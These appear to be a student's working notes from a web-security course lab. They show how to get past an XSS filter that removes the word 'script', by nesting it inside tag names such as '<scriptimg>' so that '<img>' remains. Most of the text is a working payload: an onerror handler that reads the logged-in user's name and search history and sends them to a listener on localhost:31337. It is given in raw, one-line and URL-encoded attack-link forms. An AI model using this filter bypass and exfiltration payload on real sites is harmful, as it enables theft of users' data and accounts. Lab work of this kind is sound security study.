The way things are removed makes we think we can exploit it.
For instance:
<<sciprtimg></img>
would get replaced to
<img></img>
After trying this with python -  it ultimately failed resulting in the same message.
I tried just normal <script></script> tags and got:
<></> interestingly enough, which makes me think we can still sneak thing in there.
Which was the case.
for instance:
<scriptimg></scriptimg>
results in <img> </img> success!
We can use the same attack as last time:

<scriptimg src="fsadf" onerror='setTimeout(function() {

url="http://localhost:31337/?stolen_user=" + document.getElementById("logged-in-user").innerHTML + "&last_search=" + document.getElementById("history-list").children[1].innerHTML;

$.get(url).done(function(resp) {
console.log(resp);
});
}, 1000);'></scriptimg>

searchable payload:
<scriptimg src="fsadf" onerror='setTimeout(function(){url="http://localhost:31337/?stolen_user="+document.getElementById("logged-in-user").innerHTML+"&last_search="+document.getElementById("history-list").childNodes[1].innerHTML;$.get(url).done(function(resp){console.log(resp);});},1000);'></scriptimg>

as a url:
https://project2.ecen4133.org/search?q=%3Cscriptimg+src%3D%22fsadf%22+onerror%3D%27setTimeout%28function%28%29%7Burl%3D%22http%3A%2F%2Flocalhost%3A31337%2F%3Fstolen_user%3D%22%2Bdocument.getElementById%28%22logged-in-user%22%29.innerHTML%2B%22%26last_search%3D%22%2Bdocument.getElementById%28%22history-list%22%29.childNodes%5B1%5D.innerHTML%3B%24.get%28url%29.done%28function%28resp%29%7Bconsole.log%28resp%29%3B%7D%29%3B%7D%2C1000%29%3B%27%3E%3C%2Fscriptimg%3E
